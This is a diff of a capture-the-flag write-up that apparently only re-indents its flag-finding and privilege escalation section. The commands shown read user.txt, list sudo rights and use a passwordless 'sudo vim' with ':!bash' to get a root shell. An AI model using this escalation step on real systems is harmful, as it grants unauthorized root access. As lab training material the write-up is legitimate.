@@ -246,18 +246,18 @@ Finding Flags and Prvilage escalation
 
 <img width="482" height="64" alt="изображение" src="https://github.com/user-attachments/assets/88c601ba-c0a9-4489-8393-bd0312f6c8c2" />
 
-$ ls
-user.txt
-$ cat user.txt 
+	$ ls
+	user.txt
+	$ cat user.txt 
 
-$ id
-$ whoami
-mitch
-$ sudo -l
+	$ id
+	$ whoami
+	mitch
+	$ sudo -l
 User mitch may run the following commands on Machine:
  (root) NOPASSWD: /usr/bin/vim
 
-$ sudo vim
+	$ sudo vim
 
 use in vim tap “:” with shift button and start texting !bash and tap Enter
 We been root user
